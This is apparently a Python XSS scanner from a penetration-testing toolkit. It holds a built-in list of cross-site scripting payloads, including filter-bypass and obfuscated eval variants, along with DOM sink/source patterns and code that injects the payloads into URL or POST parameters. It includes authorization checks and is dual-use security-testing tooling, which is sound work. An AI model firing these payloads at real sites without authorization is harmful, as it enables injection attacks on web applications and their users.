#!/usr/bin/env python3
"""
XSS Scanner - Cross-Site Scripting Detection

Tests web applications for XSS vulnerabilities (reflected, stored, DOM-based).

[!] AUTHORIZATION REQUIRED: Only use on authorized targets.

Usage:
    python xss_scanner.py --url <url> [options]

Examples:
    # Basic XSS scan
    python xss_scanner.py --url "http://example.com/search?q=test"

    # Test specific parameter
    python xss_scanner.py --url "http://example.com/comment" --param message --method POST

    # Test with custom payloads
    python xss_scanner.py --url "http://example.com/page" --payloads-file xss_payloads.txt

Author: David Dashti
Date: 2025-10-15
MITRE ATT&CK: T1189 (Drive-by Compromise)
"""

import argparse
import hashlib
import re
import sys
import urllib.parse
from typing import Any

import requests
from bs4 import BeautifulSoup

from offensive_toolkit.utils.config import load_config
from offensive_toolkit.utils.helpers import RateLimiter, check_authorization, sanitize_filename, validate_url
from offensive_toolkit.utils.logger import get_logger

logger = get_logger(__name__)


# XSS payloads (safe test payloads)
XSS_PAYLOADS = [
    # Basic payloads
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(\"XSS\")'>",
    # Event handler payloads
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
    "<textarea onfocus=alert('XSS') autofocus>",
    "<keygen onfocus=alert('XSS') autofocus>",
    "<video><source onerror='alert(\"XSS\")'>",
    # Obfuscated payloads
    "<sCrIpT>alert('XSS')</sCrIpT>",
    "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    # HTML attribute injection
    '" onmouseover="alert(\'XSS\')"',
    "' onmouseover='alert(\"XSS\")'",
    "javascript:alert('XSS')",
    # SVG-based
    "<svg><script>alert('XSS')</script></svg>",
    "<svg><animate onbegin=alert('XSS')>",
    # Data URI
    "<object data='data:text/html,<script>alert(\"XSS\")</script>'>",
    # Filter bypass attempts
    "<img src=x:alert(alt) onerror=eval(src) alt=XSS>",
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
]

# DOM-based XSS detection patterns
DOM_XSS_PATTERNS = [
    r"document\.write\s*\(",
    r"document\.writeln\s*\(",
    r"\.innerHTML\s*=",
    r"\.outerHTML\s*=",
    r"eval\s*\(",
    r"setTimeout\s*\(",
    r"setInterval\s*\(",
    r"Function\s*\(",
    r"location\s*=",
    r"location\.href\s*=",
    r"location\.replace\s*\(",
    r"location\.assign\s*\(",
]

# DOM sources (user input)
DOM_SOURCES = [
    r"location\.search",
    r"location\.hash",
    r"location\.href",
    r"document\.URL",
    r"document\.documentURI",
    r"document\.referrer",
    r"window\.name",
]


class XSSScanner:
    """
    Cross-Site Scripting (XSS) vulnerability scanner.

    Tests for reflected, stored, and DOM-based XSS.
    """

    def __init__(self, config: dict[str, Any] | None = None) -> None:
        """
        Initialize XSS scanner.

        Args:
            config: Optional configuration dictionary
        """
        self.config = config or load_config()
        self.rate_limiter = RateLimiter(
            self.config.get("rate_limit", {}).get("requests_per_second", 5)
        )
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": self.config.get("http", {}).get(
                    "user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                )
            }
        )
        logger.info(f"Initialized {self.__class__.__name__}")

    def _generate_marker(self, payload: str) -> str:
        """
        Generate unique marker for payload tracking.

        Args:
            payload: XSS payload

        Returns:
            Unique marker string
        """
        return hashlib.md5(payload.encode()).hexdigest()[:8]

    def test_reflected_xss(
        self,
        url: str,
        param: str,
        payload: str,
        method: str = "GET",
        data: dict[str, str] | None = None,
    ) -> dict[str, Any] | None:
        """
        Test for reflected XSS vulnerability.

        Args:
            url: Target URL
            param: Parameter to inject
            payload: XSS payload
            method: HTTP method
            data: POST data

        Returns:
            Vulnerability details if found, None otherwise
        """
        self.rate_limiter.wait()

        try:
            timeout = self.config.get("timeouts", {}).get("connection", 10)
            marker = self._generate_marker(payload)
            marked_payload = f"{marker}{payload}"

            # Prepare request
            if method.upper() == "GET":
                # Inject into URL parameter
                parsed = urllib.parse.urlparse(url)
                params = urllib.parse.parse_qs(parsed.query)
                params[param] = [marked_payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = urllib.parse.urlunparse(
                    (
                        parsed.scheme,
                        parsed.netloc,
                        parsed.path,
                        parsed.params,
                        new_query,
                        parsed.fragment,
                    )
                )

                response = self.session.get(test_url, timeout=timeout)

            else:  # POST
                # Inject into POST data
                test_data = data.copy() if data else {}
                test_data[param] = marked_payload

                response = self.session.post(url, data=test_data, timeout=timeout)

            # Check if payload is reflected in response
            if marker in response.text and payload in response.text:
                # Check if payload is in executable context
                context = self._analyze_context(response.text, marked_payload)

                return {
                    "type": "reflected",
                    "parameter": param,
                    "payload": payload,
                    "context": context,
                    "evidence": f"Payload reflected in {context} context",
                    "confidence": self._determine_confidence(context),
                }

        except Exception as e:
            logger.debug(f"Error testing {param} with {payload}: {e}")

        return None

    def _analyze_context(self, html: str, payload: str) -> str:
        """
        Analyze the context where payload appears in HTML.

        Args:
            html: HTML response
            payload: Injected payload

        Returns:
            Context description (script, attribute, html, etc.)
        """
        try:
            soup = BeautifulSoup(html, "html.parser")

            # Find payload in HTML
            if "<script" in payload.lower() and "</script>" in payload.lower():
                # Check if script tags are intact
                if soup.find("script", text=re.compile(re.escape(payload), re.IGNORECASE)):
                    return "script"
                if payload in html:
                    # Script tags might be in HTML but not parsed (escaped or broken)
                    return "html"

            # Check for event handlers
            if re.search(r"on\w+\s*=", payload, re.IGNORECASE):
                for tag in soup.find_all():
                    for attr, value in tag.attrs.items():
                        if isinstance(value, str) and payload in value:
                            return f"attribute ({attr})"

            # Check for inline HTML
            if re.search(r"<\w+", payload):
                return "html"

            # Default to text context
            return "text"

        except Exception:
            return "unknown"

    def _determine_confidence(self, context: str) -> str:
        """
        Determine confidence level based on context.

        Args:
            context: Injection context

        Returns:
            Confidence level (high, medium, low)
        """
        if context == "script" or context.startswith("attribute"):
            return "high"
        if context == "html":
            return "medium"
        return "low"

    def test_dom_xss(self, url: str) -> list[dict[str, Any]]:
        """
        Test for DOM-based XSS vulnerabilities.

        Args:
            url: Target URL

        Returns:
            List of potential vulnerabilities
        """
        self.rate_limiter.wait()
        vulnerabilities = []

        try:
            timeout = self.config.get("timeouts", {}).get("connection", 10)
            response = self.session.get(url, timeout=timeout)

            # Search for DOM XSS patterns
            for sink_pattern in DOM_XSS_PATTERNS:
                matches = re.finditer(sink_pattern, response.text, re.IGNORECASE)

                for match in matches:
                    # Get surrounding context
                    start = max(0, match.start() - 50)
                    end = min(len(response.text), match.end() + 50)
                    context = response.text[start:end]

                    # Check if a DOM source is nearby
                    has_source = any(
                        re.search(source, context, re.IGNORECASE) for source in DOM_SOURCES
                    )

                    if has_source:
                        vulnerabilities.append(
                            {
                                "type": "dom-based",
                                "sink": match.group(),
                                "context": context.replace("\n", " ").strip(),
                                "evidence": "DOM sink with user-controlled source detected",
                                "confidence": "medium",
                            }
                        )

        except Exception as e:
            logger.debug(f"Error testing DOM XSS for {url}: {e}")

        return vulnerabilities

    def scan_url(
        self,
        url: str,
        params: list[str] | None = None,
        payloads: list[str] | None = None,
        method: str = "GET",
        data: dict[str, str] | None = None,
        test_dom: bool = True,
    ) -> list[dict[str, Any]]:
        """
        Scan URL for XSS vulnerabilities.

        Args:
            url: Target URL
            params: Parameters to test
            payloads: Custom payloads
            method: HTTP method
            data: POST data
            test_dom: Test for DOM-based XSS

        Returns:
            List of vulnerabilities found
        """
        vulnerabilities = []

        if payloads is None:
            payloads = XSS_PAYLOADS

        # Extract parameters if not provided
        if params is None:
            if method.upper() == "GET":
                parsed = urllib.parse.urlparse(url)
                params = list(urllib.parse.parse_qs(parsed.query).keys())
            elif data:
                params = list(data.keys())
            else:
                params = []

        # Test reflected XSS
        if params:
            logger.info(f"Testing {len(params)} parameters with {len(payloads)} payloads")

            for param in params:
                print(f"[*] Testing parameter: {param}")

                for payload in payloads:
                    vuln = self.test_reflected_xss(url, param, payload, method, data)
                    if vuln:
                        vulnerabilities.append(vuln)
                        print("    [+] Potential reflected XSS found!")
                        # Only report first finding per parameter
                        break

        # Test DOM-based XSS
        if test_dom:
            print("[*] Testing for DOM-based XSS...")
            dom_vulns = self.test_dom_xss(url)
            if dom_vulns:
                vulnerabilities.extend(dom_vulns)
                print(f"    [+] Found {len(dom_vulns)} potential DOM XSS pattern(s)")

        return vulnerabilities

    def run(
        self,
        url: str,
        params: list[str] | None = None,
        payloads: list[str] | None = None,
        method: str = "GET",
        data: dict[str, str] | None = None,
        test_dom: bool = True,
    ) -> dict[str, Any]:
        """
        Execute XSS scan.

        Args:
            url: Target URL
            params: Parameters to test
            payloads: Custom payloads
            method: HTTP method
            data: POST data
            test_dom: Test for DOM-based XSS

        Returns:
            Scan results
        """
        # Authorization check
        if not check_authorization(url, self.config):
            logger.error(f"URL {url} not authorized")
            return {"error": "Not authorized"}

        # Validate URL
        if not validate_url(url):
            logger.error(f"Invalid URL: {url}")
            return {"error": "Invalid URL"}

        logger.info(f"Starting XSS scan for {url}")
        print(f"\n[*] XSS Scan: {url}")

        # Perform scan
        vulnerabilities = self.scan_url(url, params, payloads, method, data, test_dom)

        results = {
            "url": url,
            "method": method,
            "parameters_tested": params or "auto-detected",
            "payloads_tested": len(payloads) if payloads else len(XSS_PAYLOADS),
            "vulnerabilities_found": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
        }

        logger.info(f"Scan complete: {len(vulnerabilities)} vulnerabilities found")
        self._save_results(results)

        return results

    def _save_results(self, results: dict[str, Any]) -> None:
        """
        Save scan results to output directory.

        Args:
            results: Results dictionary to save
        """
        import json
        from datetime import datetime
        from pathlib import Path

        output_dir = Path(self.config.get("output", {}).get("directory", "output"))
        output_dir.mkdir(exist_ok=True)

        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        url_safe = sanitize_filename(results["url"])
        filename = f"xss_{url_safe}_{timestamp}.json"
        output_path = output_dir / filename

        try:
            with open(output_path, "w") as f:
                json.dump(results, f, indent=2)
            logger.info(f"Results saved to {output_path}")
        except Exception as e:
            logger.error(f"Error saving results: {e}")


def main() -> int:
    """
    Main entry point for command-line usage.

    Returns:
        int: Exit code (0 for success, non-zero for failure)
    """
    parser = argparse.ArgumentParser(
        description="XSS Scanner - Cross-Site Scripting Detection\n"
        "[!] For authorized security testing only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument("--url", required=True, help="Target URL to scan")

    parser.add_argument("--param", help="Specific parameter to test")

    parser.add_argument(
        "--method", default="GET", choices=["GET", "POST"], help="HTTP method (default: GET)"
    )

    parser.add_argument("--data", help="POST data in format key1=value1&key2=value2")

    parser.add_argument(
        "--payloads-file", help="File containing custom XSS payloads (one per line)"
    )

    parser.add_argument("--no-dom", action="store_true", help="Skip DOM-based XSS testing")

    parser.add_argument("--config", help="Path to configuration file")

    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose output")

    args = parser.parse_args()

    # Load configuration
    config = load_config(args.config) if args.config else load_config()

    # Set log level
    if args.verbose:
        from utils.logger import set_log_level

        set_log_level(logger, "DEBUG")

    print("\n" + "=" * 70)
    print("[!] XSS Scanner - For Authorized Security Testing Only")
    print("=" * 70)

    # Create scanner
    scanner = XSSScanner(config)

    # Load custom payloads if provided
    payloads = None
    if args.payloads_file:
        try:
            with open(args.payloads_file) as f:
                payloads = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(payloads)} custom payloads")
        except FileNotFoundError:
            print(f"[-] Error: Payloads file {args.payloads_file} not found")
            return 1

    # Parse POST data if provided
    post_data = None
    if args.data:
        post_data = dict(urllib.parse.parse_qsl(args.data))

    # Determine parameters to test
    params = [args.param] if args.param else None

    # Run scan
    results = scanner.run(args.url, params, payloads, args.method, post_data, not args.no_dom)

    if "error" in results:
        print(f"\n[-] Error: {results['error']}")
        return 1

    # Print summary
    print("\n[+] Scan Summary:")
    print(f"    URL: {results['url']}")
    print(f"    Method: {results['method']}")
    print(f"    Payloads Tested: {results['payloads_tested']}")
    print(f"    Vulnerabilities Found: {results['vulnerabilities_found']}")

    if results["vulnerabilities"]:
        print("\n[+] Vulnerabilities:")
        for vuln in results["vulnerabilities"]:
            print(f"\n    Type: {vuln['type']}")
            if "parameter" in vuln:
                print(f"    Parameter: {vuln['parameter']}")
                print(f"    Payload: {vuln['payload']}")
            if "sink" in vuln:
                print(f"    Sink: {vuln['sink']}")
            print(f"    Evidence: {vuln['evidence']}")
            print(f"    Confidence: {vuln['confidence']}")
    else:
        print("\n[+] No XSS vulnerabilities detected")

    return 0


if __name__ == "__main__":
    sys.exit(main())
